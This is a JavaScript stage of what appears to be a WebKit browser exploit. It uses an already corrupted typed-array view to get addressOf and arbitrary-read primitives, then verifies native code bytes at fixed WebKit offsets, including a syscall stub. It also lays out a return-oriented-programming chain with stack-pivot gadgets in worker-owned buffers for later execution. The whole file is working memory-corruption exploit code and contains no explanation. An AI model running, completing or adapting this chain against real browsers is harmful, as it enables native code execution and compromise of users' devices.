// Diagnose the live typed-array cell if the first backing pointer is zero.
// No native call or worker thread is started by this command.
var state = window.__fw14ArrayState;
var main = window.__fw14NativePlan;
var phase = "preflight";
try {
  if (!state || !main || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !state.calibratedViewBase ||
      !main.webkitBase || !main.target || !main.addresses ||
      state.array[0] !== state.a)
    throw new Error("held_state_missing");
  var forged = state.view;
  var a = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
      !Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("held_view_changed");
  function bytesAt(index) {
    var out = [];
    for (var i = 0; i < 8; i++) out.push(forged[index + i]);
    return out;
  }
  function numberOf(bytes) {
    var out = 0;
    for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
    return out;
  }
  function ptrBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(value) {
    try {
      state.array[0] = value;
      return numberOf(bytesAt(state.index));
    } finally {
      state.array[0] = state.a;
    }
  }
  var aIndex = addressOf(a) - base;
  var slot = aIndex + 8;
  if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
    throw new Error("read_pointer_slot_invalid");
  var original = bytesAt(slot);
  function readAt(address, length) {
    if (!Number.isSafeInteger(address) || address < 0x100000000 ||
        address >= 0x1000000000000 || length < 1 || length > 64)
      throw new Error("read_address_or_length_invalid");
    var next = ptrBytes(address);
    try {
      for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
      var out = [];
      for (var j = 0; j < length; j++) out.push(a[j]);
      return out;
    } finally {
      for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
    }
  }
  function same(left, right) {
    if (left.length !== right.length) return false;
    for (var i = 0; i < left.length; i++)
      if (left[i] !== right[i]) return false;
    return true;
  }
  function validAddress(value) {
    return Number.isSafeInteger(value) && value >= 0x100000000 &&
      value < 0x1000000000000 && value % 8 === 0;
  }
  phase = "code_bytes";
  if (!same(readAt(main.target, 16),
            [0x48,0xc7,0xc0,0x14,0,0,0,0x49,0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48]) ||
      !same(readAt(main.webkitBase + 0x295f948, 9),
            [0x48,0x8b,0x7e,0x30,0x48,0x8b,0x07,0xff,0x10]) ||
      !same(readAt(main.addresses.stack + main.stackOffset, 8),
            ptrBytes(main.target)))
    throw new Error("live_native_code_or_main_plan_changed");
  phase = "allocate";
  var store = new Uint8Array(0x20);
  var pivot = new Uint8Array(0x40);
  var stack = new Uint8Array(0x2000);
  var frame = new Uint8Array(0x40);
  function dataOf(view) {
    var cell = addressOf(view);
    if (!validAddress(cell))
      throw new Error("new_view_cell_invalid_" + view.length + "_" +
                      cell.toString(16));
    var raw = readAt(cell + 8, 8);
    var data = numberOf(raw);
    if (!validAddress(data)) {
      var cellBytes = readAt(cell, 32);
      throw new Error("new_view_data_invalid_" + view.length + "_" +
                      cell.toString(16) + "_" + data.toString(16) + "_" +
                      raw.map(function (value) {
                        return (value < 16 ? "0" : "") + value.toString(16);
                      }).join("") + "_" +
                      cellBytes.map(function (value) {
                        return (value < 16 ? "0" : "") + value.toString(16);
                      }).join(""));
    }
    return data;
  }
  var addresses = {
    store: dataOf(store), pivot: dataOf(pivot),
    stack: dataOf(stack), frame: dataOf(frame)
  };
  var views = [store, pivot, stack, frame];
  var keys = ["store", "pivot", "stack", "frame"];
  for (var x = 0; x < keys.length; x++) {
    for (var y = x + 1; y < keys.length; y++) {
      if (addresses[keys[x]] < addresses[keys[y]] + views[y].length &&
          addresses[keys[y]] < addresses[keys[x]] + views[x].length)
        throw new Error("worker_owned_ranges_overlap");
    }
    for (var z = 0; z < keys.length; z++)
      if (addresses[keys[x]] < main.addresses[keys[z]] + main[keys[z]].length &&
          main.addresses[keys[z]] < addresses[keys[x]] + views[x].length)
        throw new Error("worker_buffer_overlaps_main_plan");
  }
  function put(view, at, value) {
    view.setUint32(at, value >>> 0, true);
    view.setUint32(at + 4, Math.floor(value / 0x100000000) >>> 0, true);
  }
  phase = "build";
  var storeView = new DataView(store.buffer);
  var pivotView = new DataView(pivot.buffer);
  var stackView = new DataView(stack.buffer);
  put(storeView, 0, main.webkitBase + 0x1d989e3);
  put(storeView, 8, addresses.pivot);
  put(storeView, 16, main.webkitBase + 0x4a0406);
  put(storeView, 24, main.webkitBase + 0x25bae0);
  put(pivotView, 0, addresses.pivot);
  put(pivotView, 16, main.webkitBase + 0x2abccaa);
  put(pivotView, 32, main.webkitBase + 0x1ec3ada);
  var chain = [main.target, main.webkitBase + 0x5c480,
    addresses.frame, main.webkitBase + 0x548b,
    main.webkitBase + 0x10504, 0, main.webkitBase + 0x182f7];
  var stackOffset = stack.length - chain.length * 8;
  if ((addresses.stack + stackOffset) % 16 !== 0) stackOffset -= 8;
  if (stackOffset < 0 || stackOffset + chain.length * 8 > stack.length)
    throw new Error("worker_chain_outside_stack");
  for (var n = 0; n < chain.length; n++) {
    if (n === 5) {
      stackView.setUint32(stackOffset + n * 8, 0x0a, true);
      stackView.setUint32(stackOffset + n * 8 + 4, 0xfffffff7, true);
    } else put(stackView, stackOffset + n * 8, chain[n]);
  }
  put(pivotView, 56, addresses.stack + stackOffset);
  phase = "readback";
  var matched = same(readAt(addresses.store, 32), store) &&
    same(readAt(addresses.pivot, 64), pivot) &&
    same(readAt(addresses.stack + stackOffset, chain.length * 8),
         stack.subarray(stackOffset, stackOffset + chain.length * 8)) &&
    same(readAt(addresses.frame, 8), frame.subarray(0, 8));
  var restored = same(bytesAt(slot), original) &&
    a[0] === 0x31 && a[7] === 0xa8 && state.array[0] === state.a;
  if (!matched || !restored) throw new Error("worker_plan_readback_failed");
  window.__fw14WorkerPlan = { store: store, pivot: pivot,
    stack: stack, frame: frame, addresses: addresses,
    stackOffset: stackOffset, target: main.target,
    webkitBase: main.webkitBase, sourceSession: "current_page" };
  return [{ id: "worker_owned_plan_v3", status: "pass",
    details: { store: "0x" + addresses.store.toString(16),
      pivot: "0x" + addresses.pivot.toString(16),
      stack: "0x" + addresses.stack.toString(16),
      frame: "0x" + addresses.frame.toString(16),
      stack_offset: stackOffset, independent: true, restored: restored } }];
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  return [{ id: "worker_owned_plan_v3", status: "error",
    details: { phase: phase, error: String(error).slice(0, 260) } }];
}
